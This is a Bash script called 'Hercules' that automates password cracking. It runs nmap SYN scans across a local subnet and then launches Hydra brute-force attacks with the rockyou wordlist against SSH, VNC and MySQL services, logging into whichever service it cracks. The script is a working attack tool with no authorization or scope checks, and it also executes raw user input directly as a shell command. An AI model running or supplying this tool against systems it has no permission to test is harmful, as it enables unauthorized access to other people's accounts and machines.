#!/bin/bash
RED='\033[0;31m'
NC='\033[0m' # No Color

# OS of the computer
OS="Linux"

# For the wget functionality to work
SITE_URL="https://google.com"

# Root user
root=0

empty=("")

alphabet=("a" "b" "c" "d" "e" "f" "g" "h" "i" "j" "k" "l" "m" "n" "o" "p" "q" "r" "s" "t" "u" "v" "x" "y" "z" "A" "B" "C" "D" "E" "F" "G" "H" "I" "J" "K" "L" "M" "N" "O" "P" "Q" "R" "S" "T" "U" "V" "X" "Y" "Z")

# The yes array that contains the yes input
yes=("yes" "YES" "y" "Y")

# The array that contains the exit input
exit=("exit" "quit" "EXIT" "QUIT" "STOP" "stop")

# Gets the current time in a 12-hour format
CURRENT_TIME=$(date +"%I:%M:%S %p")

# Gets current date in mm/dd/yyyy format
CURRENT_DATE=$(date +"%m/%d/%Y")

# List of required packages/commands
required_packages=("wget" "nmap" "hydra" "ssh" "mysql")

# Function to check if a command exists
command_exists() {
  command -v "$1" >/dev/null 2>&1
}

# Check if root user
if [[ $EUID -ne 0 ]]; then
  echo "ERROR: Please run as root."
  exit 1
fi

# Check for required packages
for package in "${required_packages[@]}"; do
  if ! command_exists "$package"; then
    echo -e "ERROR: The required package '$package' is not installed. Please install it and try again."
    exit 1
  fi
done

# When the user enters script --help, it outputs the help message
if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
    figlet "? HELP ?"
    echo
    echo "+++++++++++++++Programs used+++++++++++++++"
    echo "This program will help you crack passwords"
    echo "It has two programs inside it, one is Hydra and the other is Nmap"
    echo
    echo "+++++++++++++++How to use++++++++++++++++++"
    echo "To use the program, you have to tell the computer what port you want to scan."
    echo "It will then scan the port that you asked for on the network and see if any ports that you asked are open."
    echo "If there are any ports that are open, it will ask for a username and hostname."
    echo "When you give the program the username and hostname, it will try to crack the given parameters you gave it."
    echo
else
    if [[ "${OSTYPE}" == *"${OS}"* ]]; then
        clear
        if [[ $EUID -ne $root ]]; then
            # Error message if not running as root
            echo "ERROR: Please run as root."
            exit
        else
            sudo rm -rf hydra.restore
            clear

            # Try to connect to the server
            wget -q --spider $SITE_URL

            # If the user is connected to the internet, it works as normal
            if [[ $? -eq 0 ]]; then
                echo
            
            # Else, it notifies them that they are not connected to the internet and tells them to connect
            else
                # Error message if offline
                echo "ERROR: You are offline. Please connect to the internet."
            fi

            # Clear the terminal
            clear

            # Tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
            Hercules() {
                # The logo of the program
                figlet -f slant "Hercules"

                echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'"
                echo "If you want to stop the program type 'stop'."
                read -p ">>> " service

                if [[ $service == "ALL" || $service == "all" ]]; then
                    # Tells the user that it can take up to an hour to complete the scanning process
                    echo -e "${RED}This can take up to 1 hour to complete.${NC}"
                    # Scan the entire network and display open ports
                    sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open
                    hydra -h
                    echo "Put in Hydra first to start the script."
                    echo ""
                    read -p ">>> " Hydra

                    if [[ " ${exit[*]} " == *" $Hydra "* ]]; then
                        echo "Goodbye"
                        exit
                    else
                        $Hydra
                        exit
                    fi

                # If the user asks what the program does, it goes to a function that helps them and explains what the program does
                elif [[ " ${exit[*]} " == *" $service "* ]]; then
                    echo "Stopping program..."
                    sleep 1
                    exit 1
                elif [[ " ${empty[*]} " == *" $service "* ]]; then
                    clear
                    Hercules

                # If the user inputs something that is not a number, it says error
                elif [[ " ${alphabet[*]} " == *" $service "* ]]; then
                    echo "ERROR please input a number next time"
                    sleep 5
                    clear
                    Hercules                
                else
                    # Scan a specific port
                    sudo nmap -sS 192.168.1.1/24 -p $service --open
                fi
            }

            RunHackingCommand() {
                # Break in the outputs of my code
                echo 
                # Services to crack the network
                echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
                echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
                read -p "Input Username: " user
                read -p "Input Hostname: " host
            }

            RunHackingCommandWithVNC() {
                if [[ $service == 5900 || $service == "VNC" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        echo "No service specified"
                        Hercules
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # it will continue as normal
                    else
                        # Crack VNC password
                        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
                        echo "Loading VNC server..."
                        xdg-open vnc://$host
                        exit
                    fi
                fi
            }

            RunHackingCommandWithSSH() {
                if [[ $service == 22 || $service == "ssh" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        echo "No service specified"
                        Hercules
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # it will continue as normal
                    else

                        # Crack SSH password
                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
                        # Alerts the user that the computer is trying to connect to the SSH server
                        title="Connecting to ${user}"
                        Connecting_To_SSH_SERVER="We are connecting you to ${user}, please wait..."
                        notify-send "$title" "$Connecting_To_SSH_SERVER"
                        
                        sleep 5

                        # It connects to the SSH server and asks for the user to input a password to connect to the SSH server
                        title="Enter password to ${user}"
                        Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
                        notify-send "$title" "$Connected_To_SSH_SERVER"
                        
                        ssh $user@$host
                    fi
                fi
            }

            RunHackingCommandWithMySQL() {
                if [[ $service == 3306 || $service == "mysql" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        echo "No service specified"
                        Hercules
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # it will continue as normal
                    else
                        # Crack MySQL password
                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
                        echo "Loading MySQL server..."
                        sleep 3
                        mysql -u $user -p -A
                    fi
                fi
            }
            
            Hercules # Calls the Hercules function

            RunHackingCommand # Calls the RunHackingCommand function

            RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function

            RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function

            RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
        fi
    else
        clear
        # Warning message for wrong OS
        echo "WARNING: Wrong OS. Please use the correct OS."
    fi
fi
